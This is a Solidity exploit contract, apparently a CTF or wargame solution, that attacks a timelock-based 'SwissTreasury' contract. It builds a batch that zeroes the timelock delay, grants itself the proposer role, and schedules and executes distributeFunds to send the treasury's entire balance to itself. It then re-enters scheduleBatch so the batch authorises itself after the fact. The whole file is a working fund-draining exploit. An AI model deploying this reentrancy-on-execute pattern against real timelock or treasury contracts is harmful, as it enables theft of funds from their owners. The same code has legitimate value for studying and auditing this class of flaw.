// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "./SwissTreasury.sol";
import "hardhat/console.sol";

contract Exploit {
    SwissTreasury instance;
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;

    constructor(SwissTreasury _instance) payable {
        instance = _instance;
    }

    function finalize() external {
        bytes memory delayData = abi.encodeWithSelector(
            TimelockController.updateDelay.selector,
            uint64(0)
        );

        targets.push(address(instance));
        values.push(0);
        dataElements.push(delayData);

        // Encode Access control grant role
        bytes memory accessControlData = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            instance.PROPOSER_ROLE(),
            address(instance)
        );

        targets.push(address(instance));
        values.push(0);
        dataElements.push(accessControlData);

        // Encode Access control grant role
        bytes memory accessControlData2 = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            instance.PROPOSER_ROLE(),
            address(this)
        );

        targets.push(address(instance));
        values.push(0);
        dataElements.push(accessControlData2);

        bytes memory distributeFundsData = abi.encodeWithSelector(
            SwissTreasury.distributeFunds.selector,
            address(this),
            address(instance).balance
        );

        bytes memory scheduleData = abi.encodeWithSelector(
            TimelockController.schedule.selector,
            address(instance),
            0,
            distributeFundsData,
            bytes32(0),
            bytes32(0),
            0
        );

        targets.push(address(instance));
        values.push(0);
        dataElements.push(scheduleData);

        bytes memory executeData = abi.encodeWithSelector(
            TimelockController.execute.selector,
            address(instance),
            0,
            distributeFundsData,
            bytes32(0),
            bytes32(0)
        );

        targets.push(address(instance));
        values.push(0);
        dataElements.push(executeData);

        // Encode schedule call
        bytes memory scheduleReentrancyData = abi.encodeWithSelector(
            Exploit.schedule.selector
        );

        // Add schedule reentrancy call to array
        targets.push(address(this));
        values.push(0);
        dataElements.push(scheduleReentrancyData);

        instance.executeBatch(targets, values, dataElements, 0, 0);
    }

    function schedule() external {
        console.log("SCHEDULED PROPIO");
        instance.scheduleBatch(
            targets,
            values,
            dataElements,
            bytes32(0),
            bytes32(0),
            0
        );
    }

    receive() external payable {}
}
